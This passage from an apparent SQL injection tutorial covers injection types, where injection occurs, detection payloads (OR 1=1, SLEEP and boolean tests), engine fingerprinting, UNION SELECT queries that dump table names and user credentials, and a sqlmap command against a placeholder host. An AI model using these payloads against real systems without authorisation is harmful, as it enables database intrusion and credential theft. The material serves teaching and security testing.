- Classic / Error-Based SQLi: Leverages verbose SQL errors to infer the database structure.
- Blind SQLi: No visible errors or output; attacker infers responses through behavior.
- Time-Based Blind SQLi: Relies on delays (SLEEP()) to test for true/false conditions.
- Out-of-Band SQLi: Uses network-based callbacks (e.g., DNS, HTTP) for results, helpful when thereâ€™s no visible or time-based feedback.
- Second-Order SQLi: Malicious input is stored in the database and triggers injection later on.


#### ðŸŒ³ Where SQLi Happens:-

SQLi is found in locations include:
- Login forms
- Search fields
- Filters (by category, date, etc.)
- GET or POST parameters
- Hidden fields
- HTTP headers (User-Agent, Referer)
- Cookies


#### ðŸŒ³ Detecting SQLi:-

Start with simple tests:

      ' OR '1'='1
      ' OR 1=1 --

Then escalate to:
 
      ' AND SLEEP(5) -- 
      ' AND (SELECT 1 FROM dual WHERE SLEEP(5)) -- 

Or boolean-based:

      ' AND 1=1 -- [returns normal]
      ' AND 1=2 -- [different behavior]

In blind cases, monitor for:
- Time delays
- Differences in page content
- HTTP status code differences
- Network request count changes


#### ðŸŒ³ Identifying the Database Engine:-
Use error messages, behaviors, or version-specific syntax:
- MySQL: SELECT version();, SLEEP(5)
- PostgreSQL: SELECT current_database();, pg_sleep(5)
- MSSQL: SELECT @@version;, WAITFOR DELAY '00:00:05'
- Oracle: SELECT banner FROM v$version, DBMS_LOCK.SLEEP(5)

Identifying the backend helps tailor payloads and exploit chains.


#### ðŸŒ³ Dumping Data:-
Once injection is confirmed, the goal is to:
Extract table names:

    ' UNION SELECT table_name FROM information_schema.tables --  

Extract column names:

    ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --  

Dump credentials:

    ' UNION SELECT username, password FROM users --  

- Tools like sqlmap can automate this entire process:

      sqlmap -u "https://target.com/search?query=*" --dbs --batch
